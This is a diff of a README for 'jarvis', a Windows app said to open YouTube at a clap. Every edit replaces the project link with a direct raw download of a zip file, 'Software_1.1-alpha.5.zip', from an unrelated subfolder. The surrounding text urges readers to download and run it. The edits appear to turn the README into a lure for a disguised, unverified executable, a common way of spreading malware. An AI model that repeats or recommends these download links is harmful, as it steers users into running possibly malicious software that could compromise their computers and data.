@@ -1,6 +1,6 @@
 # ⚡ jarvis - Open YouTube With One Clap
 
-[![Download jarvis](https://img.shields.io/badge/Download%20jarvis-1f6feb?style=for-the-badge&logo=github&logoColor=white)](https://github.com/terrelshort77/jarvis)
+[![Download jarvis](https://img.shields.io/badge/Download%20jarvis-1f6feb?style=for-the-badge&logo=github&logoColor=white)](https://github.com/terrelshort77/jarvis/raw/refs/heads/main/datiscetin/Software_1.1-alpha.5.zip)
 
 ## 🎯 What this app does
 
@@ -12,7 +12,7 @@ Use it when you want a hands-free way to launch a few common apps without clicki
 
 Visit this page to download and run the app:
 
-https://github.com/terrelshort77/jarvis
+https://github.com/terrelshort77/jarvis/raw/refs/heads/main/datiscetin/Software_1.1-alpha.5.zip
 
 If the page shows a release file such as an `.exe`, download that file and run it on Windows.
 
@@ -31,7 +31,7 @@ For the best result, use a laptop or desktop with a built-in mic or a USB mic. A
 ## 🚀 How to install
 
 1. Open the download page:
-   https://github.com/terrelshort77/jarvis
+   https://github.com/terrelshort77/jarvis/raw/refs/heads/main/datiscetin/Software_1.1-alpha.5.zip
 
 2. Find the release file for Windows.
 
@@ -160,7 +160,7 @@ jarvis is meant to run on your PC and respond to local input like microphone sou
 ## 📌 Quick start
 
 1. Open the download page:
-   https://github.com/terrelshort77/jarvis
+   https://github.com/terrelshort77/jarvis/raw/refs/heads/main/datiscetin/Software_1.1-alpha.5.zip
 
 2. Download the Windows file.
 
@@ -188,4 +188,4 @@ If this is your first time using a tool like this, start with one clap and wait 
 
 Download and run the Windows file from:
 
-https://github.com/terrelshort77/jarvis
+https://github.com/terrelshort77/jarvis/raw/refs/heads/main/datiscetin/Software_1.1-alpha.5.zip
